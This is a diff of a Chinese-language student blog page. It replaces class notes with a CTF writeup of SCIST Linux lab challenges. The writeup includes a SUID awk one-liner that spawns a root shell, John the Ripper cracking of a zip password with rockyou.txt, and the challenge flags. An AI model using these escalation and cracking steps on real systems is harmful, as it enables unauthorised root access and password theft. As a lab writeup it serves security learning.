@@ -31,7 +31,7 @@
 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>scist s6 資安筆記 [ LDN&#39;s Blog ]</title>
+<title>LDN&#39;s Blog [ LDN&#39;s Blog ]</title>
 
   <link rel="icon" href="/img/favicon.ico">
 
@@ -276,7 +276,7 @@
 <button id="toggleButton"><i class="fa-solid fa-chart-bar " ></i></button>
 <div id="overlay" class="overlay glass-wrapper overlay-bg">
   <div class="content">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%96%8B%E9%A0%AD"><span class="toc-text">開頭</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%86%E8%A8%98"><span class="toc-text">筆記</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GUI-vs-CLI"><span class="toc-text">GUI vs CLI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell"><span class="toc-text">shell</span></a>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SCIST-Linux-CTF-Writeup"><span class="toc-text">SCIST Linux CTF - Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HW0-Use-rev-command-to-read-the-flag"><span class="toc-text">HW0 - Use rev command to read the &#x2F;flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HW1-SUID-privilege-escalation"><span class="toc-text">HW1 - SUID privilege escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HW2-zip-%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3"><span class="toc-text">HW2 - zip 密碼破解</span></a></li></ol></li></ol></li></ol>
     <button id="closeButton"><i class="fa-solid fa-circle-xmark"></i></button>
   </div>
 </div>
@@ -293,49 +293,60 @@
       <header class="header">
         
           <div class="tags">
-            <a href="/tags/%E7%B4%80%E9%8C%84/" class="tag"># 紀錄</a><a href="/tags/%E8%B3%87%E5%AE%89/" class="tag"># 資安</a>
+            
           </div>
         
-          <h1 class="header-title" itemprop="headline">scist s6 資安筆記</h1>
+          <h1 class="header-title" itemprop="headline"></h1>
           <div class="post-meta">
-            最后更新: <time>10月 27, 2025</time>
+            最后更新: <time>11月 03, 2025</time>
             作者: <span itemprop="author">
               <span itemprop="name">LDN97</span>
             </span>
-            字数: <span class="post-count">689</span>
+            字数: <span class="post-count">567</span>
             预计阅读时间: <span class="post-count">2min</span> 
           </div>       
       </header>
-          <div class="page-content"><h2 id="開頭"><a href="#開頭" class="headerlink" title="開頭"></a>開頭</h2><p>紀錄一下，第一次上資安課有點緊張(?)<br>希望之後能交到朋友，一起去打比賽(該發祭品了)<br>然後gpt剛到期了，等去成大上機考前再續(前提是我能去)<br><del>vscode括號沒關會被標記紅色，好煩</del></p>
-<h2 id="筆記"><a href="#筆記" class="headerlink" title="筆記"></a>筆記</h2><p>剛講到了zeroday，這是一個可以上傳你發現的漏洞的網站，也許之後會有用紀錄一下<br>開始講CTF是什麼，這讓我想到去年我天真的想在資安0基礎的情況下準備一堂CTF社課(所以我把鳳新電研社放黑歷史)<br>講到flag格式，<del>沒聽懂</del>，之後應該就熟悉了(吧)。<br>Jeopardy怎麼念<br><del>OsGa英文真好</del><br>還有一個半小時才下課但我水快喝完了，完蛋<br>雖然還有飲料可以喝但我不喜歡喝飲料阿<br>有人把自己的discord bot token丟到github上<br>然後怎麼有人在課堂上鞭屍阿，嚴厲譴責<br>這就不得提到我把我的arch內核搞爆了然後我修不好最後整個洗掉到現在還沒重裝<br>什麼年代了我還能聽到熊貓燒香這個東西…<br>講了<code>root</code>跟<code>sudo</code>，<code>sudo</code>就是一個有授權的使用者使用<code>sudo</code>暫時借用<code>root</code>的權限來做事，比較安全且可以追溯是誰幹了哪件事</p>
-<h1 id="GUI-vs-CLI"><a href="#GUI-vs-CLI" class="headerlink" title="GUI vs CLI"></a>GUI vs CLI</h1><p>圖形化介面vs文字輸入介面，圖形介面易用但太慢，對開發者CLI快速且易用(但我菜雞沒有GUI我怎麼活阿)</p>
-<h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>shell就是使用者與作業系統交互的介面<br>shell可以做很多事(整活)<br>開始講指令(<code>ls</code>, <code>cd</code>, <code>mkdir</code>, <code>touch</code>, <code>cat</code>, <code>adduser</code>, <code>deluser</code>)<br>OsGa:<del>要期中考了自己的心比外面的天氣還涼</del><br>依序執行多個指令:<code>ls; pwd; whoami</code> (用<code>;</code>)<br>一個一個一個(?)執行下去，但前面的成功才執行下一個:<code>mkdir test &amp;&amp; cd test</code> (用<code>&amp;&amp;</code>)<br>前一個指令失敗時才執行下一個:<code>make || echo &quot;Build failed&quot;</code> (用<code>||</code>)<br>管道(<code>|</code>)將前一個指令的輸出傳給下一個:<code>cat file | grep &quot;keyword&quot;</code></p>
-<p>好多東西我直接複製貼上</p>
-<ul>
-<li><code>*</code> 匹配任意多個字元（萬用字元）</li>
-<li><code>?</code> 匹配單一字元</li>
-<li><code>~</code> 使用者家目錄（home directory）</li>
-<li><code>$</code> 變數標示，例如 <code>$USER</code>, <code>$PATH</code></li>
-<li><code>#</code> 註解符號（在指令或腳本中忽略該行內容）</li>
-<li><code>\</code> 轉義字元，用來避免符號被解讀</li>
-<li><code>&amp;</code> 將指令放到背景執行 例:<code>python app.py &amp;</code></li>
-</ul>
-<p>講了<code>nano</code>跟<code>vim</code>，反正就是趕緊地去學<code>vim</code>，下次就把你<code>nano</code> ban了</p>
-<p>寫了一題，反正就是<code>cat</code>好像被ban了要你用<code>rev</code>去讀檔案然後在<code>rev</code>回來</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev /flag | rev</span><br></pre></td></tr></table></figure>
-<p>講了一大堆工具，現在4:57他在飆車完全沒聽懂</p>
+          <div class="page-content"><h1 id="SCIST-Linux-CTF-Writeup"><a href="#SCIST-Linux-CTF-Writeup" class="headerlink" title="SCIST Linux CTF - Writeup"></a>SCIST Linux CTF - Writeup</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="HW0-Use-rev-command-to-read-the-flag"><a href="#HW0-Use-rev-command-to-read-the-flag" class="headerlink" title="HW0 - Use rev command to read the &#x2F;flag"></a>HW0 - Use rev command to read the &#x2F;flag</h3><p>題目要求使用 rev 讀取靶機下的檔案，使用兩次 rev 獲得正確的 flag。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~]</span><br><span class="line">└─$ nc 靶機</span><br><span class="line">=== Rev-Only Challenge ===</span><br><span class="line">Flag is <span class="keyword">in</span> /flag. Find a way to <span class="built_in">read</span> it.</span><br><span class="line">root@7d99e433d724:/$ rev /flag</span><br><span class="line">&#125;trats_egassem_siht_ver&#123;TSICS</span><br><span class="line">root@7d99e433d724:/$ rev /flag | rev</span><br><span class="line">SCIST&#123;rev_this_message_start&#125;</span><br><span class="line">root@7d99e433d724:/$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag:</strong> <code>SCIST{rev_this_message_start}</code></p>
+<hr>
+<h3 id="HW1-SUID-privilege-escalation"><a href="#HW1-SUID-privilege-escalation" class="headerlink" title="HW1 - SUID privilege escalation"></a>HW1 - SUID privilege escalation</h3><p>連線靶機，獲得了一個低權限的 ctfuser shell：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfuser@80f752e94032:~$</span><br></pre></td></tr></table></figure>
+
+<p>尋找系統上具有 SUID 權限的檔案：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctfuser@80f752e94032:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">... (其他標準 SUID 檔案)</span><br><span class="line">/usr/bin/awkrunner</span><br></pre></td></tr></table></figure>
+
+<p>跳出了一個提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage: /usr/bin/awkrunner [AWK_PROGRAM] [FILES...]</span><br><span class="line">Note:  Executes /usr/bin/awk with full root privileges.</span><br></pre></td></tr></table></figure>
+
+<p>發現這個 awkrunner 會以 root 執行我所提供的腳本：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/awkrunner <span class="string">&#x27;BEGIN &#123; system(&quot;/bin/sh&quot;) &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>執行後進入了一個具有 root 權限的 shell，透過這個 shell 執行 <code>/flag</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCIST&#123;awk_1s_my_pr3f3rr3d_w4y_t0_r00t&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag:</strong> <code>SCIST{awk_1s_my_pr3f3rr3d_w4y_t0_r00t}</code></p>
+<hr>
+<h3 id="HW2-zip-密碼破解"><a href="#HW2-zip-密碼破解" class="headerlink" title="HW2 - zip 密碼破解"></a>HW2 - zip 密碼破解</h3><p>題目提供一個加密的 SCIST.zip 檔案，提示密碼存在於 rockyou.txt 字典檔中。Flag 藏在解壓縮後的 PDF 檔案的「作者 (Author)」欄位，並使用 Base64 加密。</p>
+<p>使用 John the Ripper 來破解密碼：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ zip2john /home/ldn970110/文件/SCIST.zip &gt; /home/ldn970110/文件/scist.hash</span><br></pre></td></tr></table></figure>
+
+<p>接著使用 john 搭配 rockyou.txt 字典檔來破解這個 hash：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt /home/ldn970110/文件/scist.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt /home/ldn970110/文件/scist.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])</span><br><span class="line">Cost 1 (HMAC size) is 114987 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 16 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:05 4.17% (ETA: 16:12:22) 0g/s 125068p/s 125068c/s 125068C/s grass9..blah2007</span><br><span class="line">... (破解中) ...</span><br><span class="line">0g 0:00:00:13 10.48% (ETA: 16:12:27) 0g/s 124215p/s 124215c/s 124215C/s karenkim..jhvguyh</span><br><span class="line">fascist        (SCIST.zip/SCIST.pdf)     </span><br><span class="line">1g 0:00:00:14 DONE (2025-10-28 16:10) 0.06747g/s 123819p/s 123819c/s 123819C/s fish2133..efer05</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
+
+<p>John 成功找到了密碼：<strong>fascist</strong></p>
+<p>使用密碼解壓或的一個PDF，在作者欄位發現一串亂碼，透過base64解碼得到falg</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(ldn970110㉿LDNsKali)-[~/文件]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;U0NJU1R7ejFwX2NyNGNrM2RfbTN0YV9sM2FrfQ==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">SCIST&#123;z1p_cr4ck3d_m3ta_l3ak&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag:</strong> <code>SCIST{z1p_cr4ck3d_m3ta_l3ak}</code></p>
 </div>          
           <nav class="post-nav">
     
-    <a class="post-nav-item post-nav-prev" href="/2025/11/03/scist-s6-1-hw/">
-      <div class="nav-arrow">&lt;&nbsp;NEWER</div>
-      <span class="post-title"></span>
-    </a>
     
-    
-    <a class="post-nav-item post-nav-next" href="/2025/10/21/hello-world/">
+    <a class="post-nav-item post-nav-next" href="/2025/10/25/scist-s6-1/">
       <div class="nav-arrow">OLDER&nbsp;&gt;</div>
-      <span class="post-title">maybe a good night</span>
+      <span class="post-title">scist s6 資安筆記</span>
     </a>
     
   </nav>
